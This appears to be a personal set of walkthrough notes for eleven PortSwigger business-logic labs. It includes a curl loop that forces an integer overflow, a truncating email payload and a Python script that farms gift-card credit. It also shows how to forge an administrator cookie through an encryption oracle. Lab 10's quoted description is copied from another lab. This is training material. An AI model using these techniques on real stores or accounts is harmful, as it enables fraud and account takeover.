---
created: 2026-06-24
---



| `#`   | Solved? | Name                                           | Date    | Notes |
| ----- | ------- | ---------------------------------------------- | ------- | ----- |
| `1.`  | `✓`     | Excessive trust in client-side controls        | `29.06` |       |
| `2.`  | `✓`     | High-level logic vulnerability                 | `29.06` |       |
| `3.`  | `✓`     | Inconsistent security controls                 | `02.07` |       |
| `4.`  | `✓`     | Flawed enforcement of business rules           | `02.07` |       |
| `5.`  | `✓`     | Low-level logic flaw                           | `29.06` |       |
| `6.`  | `✓`     | Inconsistent handling of exceptional input     | `29.06` |       |
| `7.`  | `✓`     | Weak isolation on dual-use endpoint            | `02.07` |       |
| `8.`  | `✓`     | Insufficient workflow validation               | `02.07` |       |
| `9.`  | `✓`     | Authentication bypass via flawed state machine | `02.07` |       |
| `10.` |         | Infinite money logic flaw                      |         |       |
| `11.` | `✓`     | Authentication bypass via encryption oracle    | `03.07` |       |

## 1. Excessive trust in client-side controls

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Excessive trust in client-side controls`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)
> - Level: #Apprentice 
> 
> This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. Notice you have `$100.0` store credits initially. 

![[images/walkthrough/PortSwigger/Logic flaws/lab1/1.png]]

- The jacket you need to buy costs `$1337.0`.
- To test how the purchase flow works, choose a cheaper product, add it to your cart, and then check out.
- In Burp history, the flow looks like this:

![[images/walkthrough/PortSwigger/Logic flaws/lab1/2.png]]

- See a `POST` request to `/cart` that adds the chosen product to the cart:

![[images/walkthrough/PortSwigger/Logic flaws/lab1/3.png]]

- The parameters specify: 
	- The product ID,
	- Where to redirect the user once the product is added to the cart,
	- How many products to add (quantity),
	- And the product price (in cents).

 >[!question] Can you manipulate the price?

- Send this request to `Repeater`. Change the product ID to `1` (the leather jacket) and price to `1`. Send the request:

![[images/walkthrough/PortSwigger/Logic flaws/lab1/4.png]]

- See the application accepts it. Go to `/cart` and see the jacket for one cent:

![[images/walkthrough/PortSwigger/Logic flaws/lab1/5.png]]

- `Place order`.

![[images/walkthrough/PortSwigger/Logic flaws/lab1/solved.png]]

Solved!
## 2. High-level logic vulnerability

>![done]
 
>[!note]+ Lab description
> 
> - [`Lab: High-level logic vulnerability`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)
> - Level: #Apprentice 
> 
> This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and see you have `$100` store credits at the beginning.

![[images/walkthrough/PortSwigger/Logic flaws/lab2/1.png]]

- Choose a product you can afford, add it to cart, and checkout. 
- The flow looks like this:

![[images/walkthrough/PortSwigger/Logic flaws/lab2/2.png]]

- Send a `POST` request to `/cart` to `Repeater`.
- Two parameters determine which product and of which quantity will be added to the cart: `productId` and `quantity`. 
- The application assumes the quantity is always a positive integer — a value above `0` but less than the number of items currently available in stock.
- If the application doesn't actually validate this, only assumes the user won't submit an unexpected value, it might accept negative values.
- Change quantity of this request to `-1` and see the application accept it:

![[images/walkthrough/PortSwigger/Logic flaws/lab2/3.png]]

- Go to `/cart` and see it displays `-1` items in the cart and a negative sum:

![[images/walkthrough/PortSwigger/Logic flaws/lab2/4.png]]

- `Place order`. See the application throws an error:

![[images/walkthrough/PortSwigger/Logic flaws/lab2/5.png]]

- It says *the total* price can't be less than zero. But it doesn't error on a specific item with a negative price in the cart. 
- What if you can add the expensive jacket to your cart (positive price of `$1337.0`) and then reduce the total price of the cart by adding other products with negative quantity? You will get a negative number of these products in the cart and one jacket. The total cart price will be more than zero.

---
- To check this, add the jacket to the cart.
- Now your total cart price is `$1337.0` - `$6.26` = `$1330.74` and `0` items in the cart:

![[images/walkthrough/PortSwigger/Logic flaws/lab2/6.png]]

- Add some more products with negative `quantity` to reduce the total cart price to a sum you can afford.
- So in the end you have a picture like this:

![[images/walkthrough/PortSwigger/Logic flaws/lab2/7.png]]

- `Place order`. Now you've bought one jacket and -81 other things.

![[images/walkthrough/PortSwigger/Logic flaws/lab2/solved.png]]

Solved!
## 3. Inconsistent security controls

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Inconsistent security controls`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)
> - Level: #Apprentice 
> 
> This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete the user `carlos`.

### Solution

- Go to `/admin`. See an error:

![[images/walkthrough/PortSwigger/Logic flaws/lab3/1.png]]

- Go to the registration page and see the message: `If you work for DontWannaCry, please use your @dontwannacry.com email address`.

![[images/walkthrough/PortSwigger/Logic flaws/lab3/2.png]]

- Register a regular account using an email address available in the exploit server. It is verified, so you can't submit `@dontwannacry.com` directly.  
- Register an account with an email from your exploit server. Log in and see an email change functionality:

![[images/walkthrough/PortSwigger/Logic flaws/lab3/3.png]]

- Change your email to a `@dontwannacry.com` one. See the application accepts it:

![[images/walkthrough/PortSwigger/Logic flaws/lab3/4.png]]

- Now you have access to the admin panel. Navigate there and delete the user `carlos`.

![[images/walkthrough/PortSwigger/Logic flaws/lab3/solved.png]]

Solved!
## 4. Flawed enforcement of business rules

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Flawed enforcement of business rules`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)
> - Level: #Apprentice 
> 
> This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Navigate to the lab and see a code `NEWCUSTS5`. 
- Log in as `wiener` and see you have `$100.0` store credits in the beginning. 

![[images/walkthrough/PortSwigger/Logic flaws/lab4/1.png]]

- Scroll down the main page and see a sign-up to newsletter form:

![[images/walkthrough/PortSwigger/Logic flaws/lab4/2.png]]

- Submit an email address and see an alert with another code, `SIGNUP30`:

![[images/walkthrough/PortSwigger/Logic flaws/lab4/3.png]]

- Add a leather jacket to the cart.
- Test different variations to apply the codes.
- You can add `NEWCUSTS5` only ones. If you attempt adding it twice, you see an error `Coupon already applied`.

![[images/walkthrough/PortSwigger/Logic flaws/lab4/4.png]]

- Same with `SIGNUP30`:

![[images/walkthrough/PortSwigger/Logic flaws/lab4/5.png]]

- You can also add two different codes:

![[images/walkthrough/PortSwigger/Logic flaws/lab4/6.png]]

- Now see that **you can add more codes by interleaving them**. Applying the same code in two consecutive requests won't work, but applying one after another does.
- With a few requests, reduce the jacket price to `0.00`:

![[images/walkthrough/PortSwigger/Logic flaws/lab4/7.png]]

- `Place order`.

![[images/walkthrough/PortSwigger/Logic flaws/lab4/solved.png]]

Solved!
## 5. Low-level logic flaw

>[!done]+

>[!note]+ Lab description
> - [`Lab: Low-level logic flaw`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)
> - Level: #Practitioner 
> 
> 
> This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. At the beginning, you have `$100` credits.
- Choose a product you can afford, add it to the cart, and place order.
- In Burp history, the flow looks like this:

![[images/walkthrough/PortSwigger/Logic flaws/lab5/1.png]]

- Send a `POST` to `/cart` to `Repeater`. Add a product with a negative quality to the cart. The application doesn't throw an error but the item does not appear in the cart after all.
- Even if you can't submit a negative value, maybe you can add so many items to the cart that the total price overflows an integer used to signify that price so you first end up with a negative value and then add more to end up with a low value?
---
- To check this, add many jackets to the cart. Notice that you can't add more than `99` at once:

![[images/walkthrough/PortSwigger/Logic flaws/lab5/2.png]]


- As you add jackets, the price in the cart continues to increase:

![[images/walkthrough/PortSwigger/Logic flaws/lab5/3.png]]

- But at some point, the price becomes negative:

![[images/walkthrough/PortSwigger/Logic flaws/lab5/4.png]]

- To automate the process, you can use a simple Bash loop (or using Turbo Intruder):

```bash
for i in $(seq 1 20)
do
	curl -i -s -k -X 'POST' \
		-H 'Host: 0a6200a7041074e3809ad0d600d000fa.web-security-academy.net'\
		-H 'Content-Length: 37' \
		-H 'Content-Type: application/x-www-form-urlencoded' \
		-H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
		-b $'session=CkRRIwpGNsNzowG8VMSffOuaqRcYmwSa' \
		--data-binary $'productId=1&redir=PRODUCT&quantity=99' \
		'https://0a6200a7041074e3809ad0d600d000fa.web-security-academy.net/cart'
done
```

- Adjust the price with another cheaper product so it fits your credits.
- You should get something like this in the end:

![[images/walkthrough/PortSwigger/Logic flaws/lab5/5.png]]

![[images/walkthrough/PortSwigger/Logic flaws/lab5/solved.png]]

Solved!
## 6. Inconsistent handling of exceptional input

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Inconsistent handling of exceptional input`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input) 
> - Level: #Practitioner 
> 
> This lab doesn't adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete the user `carlos`.

### Solution

- Navigate to `Register`. See the message: `If you work for DontWannaCry, please use your @dontwannacry.com email address`.

![[images/walkthrough/PortSwigger/Logic flaws/lab6/1.png]]

- It seems, to access admin functionality, you need such an address. 
- But for now, register an account with the address given in the exploit server.
- See that registering an account requires visiting a confirmation link sent to the email.

- The flow looks like this:

![[images/walkthrough/PortSwigger/Logic flaws/lab6/2.png]]

- The temporary registration token sent in the email URL is random and is validated. 
- So, the goal is to register such an account which has an email address such that:
	- The application stores and treats as ending with `@dontwannacry.com`
	- But actually sends a verification link to your exploit server mailbox. 

- This is a string value. So, what if you can truncate the last part somehow for the email registration functionality?

---

- Using `Repeater` (to bypass client-side controls), register an account with the following email (replace with your exploit server domain):


```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%40dontwannacry.com.exploit-0a8f001e039e573a811a160001670012.exploit-server.net
```

![[images/walkthrough/PortSwigger/Logic flaws/lab6/3.png]]


- Follow the link sent to the email and see `Account registration successful!` message:

![[images/walkthrough/PortSwigger/Logic flaws/lab6/4.png]]

- Log into that account and see you have access to the admin panel:

![[images/walkthrough/PortSwigger/Logic flaws/lab6/5.png]]

- Go to `Admin panel` and delete the user `carlos`.

![[images/walkthrough/PortSwigger/Logic flaws/lab6/solved.png]]

Solved!
## 7. Weak isolation on dual-use endpoint

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Weak isolation on dual-use endpoint`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
> - Level: #Practitioner 
> 
> This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete the user `carlos`.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. See a email and password change functionality:

![[images/walkthrough/PortSwigger/Logic flaws/lab7/1.png]]

- Test both and inspect requests.

![[images/walkthrough/PortSwigger/Logic flaws/lab7/2.png]]

- Send password-changing request to `Repeater`.
- Attempt to send the same request but submit an invalid password to the `current-password` parameter. See an error: `Current password is incorrect`.

![[images/walkthrough/PortSwigger/Logic flaws/lab7/3.png]]

- Remove the `current-password` parameter entirely and resend the request. See it works:

![[images/walkthrough/PortSwigger/Logic flaws/lab7/4.png]]

- Change username from `wiener` to `administrator`. See the application accepts this, too:

![[images/walkthrough/PortSwigger/Logic flaws/lab7/5.png]]

- Log in as `administrator` with the password you just set. Go to `Admin panel` and delete the user `carlos`.

![[images/walkthrough/PortSwigger/Logic flaws/lab7/solved.png]]

Solved!
## 8. Insufficient workflow validation

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Insufficient workflow validation`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
> - Level: #Practitioner 
> 
> This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and see you have `$100.0` store credits at the beginning.
- Choose an item you can afford, add it to the cart, then `Place order`. In HTTP history, the flow looks like this:

![[images/walkthrough/PortSwigger/Logic flaws/lab8/1.png]]

- Send a `GET` request to `/cart/order-confirmation?order-confirmed=true` to `Repeater`.
- Add the jacket to the cart. 
- Send the `GET` request to `/cart/order-confirmation?order-confirmed=true` again. See the application confirms the order without a checkout:

![[images/walkthrough/PortSwigger/Logic flaws/lab8/2.png]]


![[images/walkthrough/PortSwigger/Logic flaws/lab8/solved.png]]

Solved!
## 9. Authentication bypass via flawed state machine

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Authentication bypass via flawed state machine`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
> - Level: #Practitioner 
> 
> This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete the user `carlos`.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. See a role selector with the options `User` and `Content creator`:

![[images/walkthrough/PortSwigger/Logic flaws/lab9/1.png]]

- In HTTP history, the login request sequence looks like this:

![[images/walkthrough/PortSwigger/Logic flaws/lab9/2.png]]

- Attempt to access `/admin`, see an error:

![[images/walkthrough/PortSwigger/Logic flaws/lab9/3.png]]

- `/role-selector` has two options: `User` and `Content creator`. You need something like `administrator`. Capturing the request and modifying it doesn't work. 
- You select a role at login, but what is the default? Log out and log in again with `Intercept on`, and drop a `GET` to `/role-selector`. Navigate to lab home and see a link to `Admin panel`:

![[images/walkthrough/PortSwigger/Logic flaws/lab9/4.png]]

- Go to the admin panel and delete the user `carlos`.

![[images/walkthrough/PortSwigger/Logic flaws/lab9/solved.png]]

Solved!
## 10. Infinite money logic flaw


>[!note]+ Lab description
> 
> - [`Lab: Infinite money logic flaw`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
> - Level: #Practitioner 
> This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete the user `carlos`.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. Initially you have `$100.0` store credits.
- Scroll down the home lab and sign up to a newsletter. This gets you `SIGNUP30` code:

![[images/walkthrough/PortSwigger/Logic flaws/lab10/1.png]]

- Add gift card worth `$10` to your cart. Apply the coupon — it becomes `$7.00`. `Place order`. Now redeem the card and get `$10` — for just `$7`.
- Your balance is now `$103.0`:

![[images/walkthrough/PortSwigger/Logic flaws/lab10/2.png]]

![[images/walkthrough/PortSwigger/Logic flaws/lab10/3.png]]

- Study the proxy history and notice that you redeem your gift card by supplying the code in the `gift-card` parameter of the `POST /gift-card` request.
- Click  **Settings** in the top toolbar. The **Settings** dialog opens.
- Click **Sessions**. In the **Session handling rules** panel, click **Add**. The **Session handling rule editor** dialog opens.
- In the dialog, go to the **Scope** tab. Under **URL scope**, select **Include all URLs**.

![[images/walkthrough/PortSwigger/Logic flaws/lab10/4.png]]

- Go back to the **Details** tab. Under **Rule actions**, click **Add** > **Run a macro**. Under **Select macro**, click **Add** again to open the **Macro Recorder**.

![[images/walkthrough/PortSwigger/Logic flaws/lab10/5.png]]

- Select the following sequence of requests:

```
POST /cart
POST /cart/coupon
POST /cart/checkout
GET /cart/order-confirmation?order-confirmed=true
POST /gift-card
```

![[images/walkthrough/PortSwigger/Logic flaws/lab10/6.png]]

Then, click **OK**. The **Macro Editor** opens.
    
- In the list of requests, select `GET /cart/order-confirmation?order-confirmed=true`. Click **Configure item**. In the dialog that opens, click **Add** to create a custom parameter. Name the parameter `gift-card` and highlight the gift card code at the bottom of the response. Click **OK** twice to go back to the **Macro Editor**.

![[images/walkthrough/PortSwigger/Logic flaws/lab10/7.png]]


- Select the `POST /gift-card` request and click **Configure item** again. In the **Parameter handling** section, use the drop-down menus to specify that the `gift-card` parameter should be derived from the prior response (response 4). Click **OK**.

![[images/walkthrough/PortSwigger/Logic flaws/lab10/8.png]]

- In the **Macro Editor**, click **Test macro**. Look at the response to `GET /cart/order-confirmation?order-confirmation=true` and note the gift card code that was generated. Look at the `POST /gift-card` request. Make sure that the `gift-card` parameter matches and confirm that it received a `302` response. Keep clicking **OK** until you get back to the main Burp window.
- Send the `GET /my-account` request to Burp Intruder. Make sure that **Sniper attack** is selected.
- In the **Payloads** side panel, under **Payload configuration**, select the payload type **Null payloads**. Choose to generate `412` payloads.
- Click on  **Resource pool** to open the **Resource pool** side panel. Add the attack to a resource pool with the **Maximum concurrent requests** set to `1`. Start the attack.
- When the attack finishes, you will have enough store credit to buy the jacket and solve the lab.


- Alternatively, use this Python code:

```python
import requests
import os
import sys
from bs4 import BeautifulSoup

# POST /cart
def add_gift_card_to_cart(base_url, headers):
    url = f'{base_url}/cart'
    data = {
        'productId': '2',
        'redir': 'PRODUCT',
        'quantity': '10'
    }
    response = requests.post(url, headers=headers, data=data)
    if response.status_code != 200:
        print(f'Failed to add gift card to cart: {response.status_code}\nResponse: {response.text}')
    return response

def apply_coupon(base_url, headers, csrf):
    url = f'{base_url}/cart/coupon'
    data = {
        'csrf': csrf,
        'coupon': 'SIGNUP30'
    }
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    if response.status_code != 302:
        print(f'Failed to apply coupon: {response.status_code}\nResponse: {response.text}')
    return response

def get_cart(base_url, headers):
    url = f'{base_url}/cart'
    response = requests.get(url, headers=headers)
    if response.status_code != 200:
        print(f'Failed to GET cart: {response.status_code}\nResponse: {response.text}')
    return response

def checkout(base_url, headers, csrf):
    url = f'{base_url}/cart/checkout'
    data = {
        'csrf': csrf
    }
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    if response.status_code != 303:
        print(f'Checkout failed: {response.status_code}\nResponse: {response.text}')
    return response

def parse_codes(base_url, headers):
    url = f'{base_url}/cart/order-confirmation?order-confirmed=true'
    response = requests.get(url, headers=headers)
    if response.status_code != 200:
        print(f'Failed to get order confirmation page: {response.status_code}')
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    try:
        table = soup.find('table', class_='is-table-numbers')
        if not table:
            print('Could not find the codes table on the page.')
            return []
        codes = [td.text.strip() for td in table.find_all('td')]
        return codes
    except Exception as e:
        print(f'Error parsing codes: {e}')
        return []

def apply_codes(codes, base_url, headers, csrf):
    url = f'{base_url}/gift-card'
    success = True

    success = True
    for code in codes[:10]: # first 10 codes
        data = {
            'csrf': csrf,
            'gift-card': code
        }
        response = requests.post(url, headers=headers, data=data)
        if response.status_code != 200:
            print(f'Failed to apply gift card {code}: {response.status_code}\nResponse: {response.text}')
            success = False
    return success

def main():
    LAB_ID = os.getenv('LAB_ID', 'default')
    SESSION_ID = os.getenv('SESSION_ID', 'default')
    CSRF = os.getenv('CSRF', 'default')

    if 'default' in [LAB_ID, SESSION_ID, CSRF]:
        print('Please set LAB_ID, SESSION_ID, and CSRF environment variables before running.')
        return

    host = f"{LAB_ID}.web-security-academy.net"
    base_url = f'https://{host}'

    headers = {
        'Host': host,
        'Cookie': f'session={SESSION_ID}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': f'{base_url}/login',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    }

    print('[*] Adding gift card to cart...')
    add_resp = add_gift_card_to_cart(base_url, headers)
    if add_resp.status_code != 200:
        print('Failed to add gift card to cart, aborting.')
        return

    print('[*] Getting /cart...')
    cart_resp = get_cart(base_url, headers)
    if cart_resp.status_code != 200:
        print('Failed to GET card, aborting.')
        return

    print('[*] Applying coupon SIGNUP30...')
    coupon_resp = apply_coupon(base_url, headers, CSRF)
    if coupon_resp.status_code != 302:
        print('Failed to apply coupon, aborting.')
        return

    print('[*] Getting /cart...')
    cart_resp = get_cart(base_url, headers)
    if cart_resp.status_code != 200:
        print('Failed to GET card, aborting.')
        return

    print('[*] Checking out...')
    checkout_resp = checkout(base_url, headers, CSRF)
    if checkout_resp.status_code != 303:
        print('Checkout failed, aborting.')
        return

    print('[*] Parsing gift card codes from confirmation...')
    codes = parse_codes(base_url, headers)
    if not codes:
        print('No gift card codes found, aborting.')
        return

    print(f'[*] Found gift card codes: {codes}')
    print('[*] Applying gift card codes to cart...')
    success = apply_codes(codes, base_url, headers, CSRF)
    if success:
        print('[+] Successfully applied all gift card codes.')
    else:
        print('[-] Failed to apply some gift card codes.')

if __name__ == '__main__':
    try:
        for i in range(300):
            print(f'####### CYCLE {i} #######')
            main()
    except KeyboardInterrupt:
        print('\n[!] Keyboard interrupt detected, exiting gracefully...')
        sys.exit(0)
```
## 11. Authentication bypass via encryption oracle


>[!note]+ Lab description
> - [`Lab: Authentication bypass via encryption oracle`](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
> - Level: #Practitioner 
> 
> This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete the user `carlos`.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and make sure to check the `Stay logged in` checkbox.

![[images/walkthrough/PortSwigger/Logic flaws/lab11/1.png]]


- Go to any blog post and leave a comment with an invalid email. Attempt to post it and see an error: `Invalid email address: invalidemail`.

![[images/walkthrough/PortSwigger/Logic flaws/lab11/2.png]]

- Inspect the request in Burp and see the application sets a `notification` cookie in and redirects you to the blog post on an attempt to post a comment with an invalid email:

![[images/walkthrough/PortSwigger/Logic flaws/lab11/3.png]]

- The value is opaque, seems to be encrypted. 
- In the `GET` request to the blog psot caused by the redirection you submit the `notification` cookie, and the response contains a notification message:

![[images/walkthrough/PortSwigger/Logic flaws/lab11/4.png]]

- If you remove the `notification` cookie in `Repeater` the notification message is gone.

![[images/walkthrough/PortSwigger/Logic flaws/lab11/5.png]]

- If you preserve the cookie but change the blog post, the message remains.

- Append a character to the `notification` cookie value, and see a `500 Internal Server Error` message: `Last unit does not have enough valid bits`.

![[images/walkthrough/PortSwigger/Logic flaws/lab11/6.png]]

- Remove the last character instead and see another `500 Internal Server Error` message: `Input length must be multiple of 16 when decrypting with padded cipher`.

![[images/walkthrough/PortSwigger/Logic flaws/lab11/7.png]]

- This clearly suggests encryption, and reveals it is done using a padded cipher.
- This means that somehow the application is retrieving this plain text from the encrypted notification cookies that we send inside the cookie header.
- This means that if you change the value of the notification cookie, whatever you place inside the notification cookie is going to get decrypted by the application.
- This is something that's referred to as a **decryption oracle**.

- But the application also has an **encryption oracle**. When you submit an invalid email address, it is encrypted as part of an error message and sent in the `notification`. This means you have some level of control of what is encrypted.
- So `POST` to comments is your encryption oracle, and `GET` to a blog post is your decryption oracle:

![[images/walkthrough/PortSwigger/Logic flaws/lab11/9.png]]
 
- The `stay-logged-in` cookie value appears to be encrypted, too. Submit it as a value of the `notification` cookie to see the decrypted version. You see your username `wiener` and a timestamp:

![[images/walkthrough/PortSwigger/Logic flaws/lab11/8.png]]

- Since this is authentication bypass, one idea is that the application decrypts the `stay-logged-in` cookie, takes a username from the decrypted value and authorizes your requests as that user. The timestamp is unlikely to matter here as long as the cookie follows the specified format.
- So it might be the case that if you manage to get a valid encrypted cookie with `administrator` instead, you will be treated as that user by the application and therefore bypass authentication.
---
- Go to encryption oracle, and submit the decrypted value of the `stay-logged-in` cookie as an email, then change `wiener` to `administrator`:

![[images/walkthrough/PortSwigger/Logic flaws/lab11/10.png]]

- Now decrypt the obtained value:

![[images/walkthrough/PortSwigger/Logic flaws/lab11/11.png]]

- The value is successfully decrypted. See that the encrypted value is prepended with `Invalid email address: ` (`23` bytes). But you need just the part after that.
---

- From the previous error messages about `16` bytes multiple, we know this is a block cipher.
- In other works, you need to append **padding** to the input string to ensure you're providing a multiple of `16`.

>[!warning] The lab uses a simplification of what is usually in the web apps, so you are unlikely to encounter that pattern. Though the lab is good for understanding.

- So you need to remove `23` bytes. To make sure you end up with a multiple of `16`, add `9` bytes to then remove `32`:

```bash
xxxxxxxxxadministrator:1783064404305
```

![[images/walkthrough/PortSwigger/Logic flaws/lab11/12.png]]

- Copy the value, paste to the decryption oracle.

![[images/walkthrough/PortSwigger/Logic flaws/lab11/13.png]]

- Now send that `notification` cookie value to decoder. Decode as URL, then Base64, remove the first `32` bytes (select the first two rows, right-click -> `Delete selected bytes`):

![[images/walkthrough/PortSwigger/Logic flaws/lab11/14.png]]


- Submit a Base64-encoded URL-encoded value to the decryption oracle:

![[15.png]]

![[16.png]]

- Now you have an encrypted version of `administrator:` + timestamp.
- Go to `/admin` and submit the obtained value as a `stay-logged-in-cookie`. You still see `401 Unauthorized`, so remove the `session` cookie. See you get access to the admin panel:

![[17.png]]

- Delete the user `carlos` by sending a `GET` to `/admin/delete?username=carlos`:

![[18.png]]

![[images/walkthrough/PortSwigger/Logic flaws/lab11/solved.png]]

Solved!

>[!note] Reference: [`Business Logic Vulnerability - Authentication Bypass via Encryption Oracle — z3nsh3ll, YouTube`](https://www.youtube.com/watch?v=p0i0GqqIJIE).

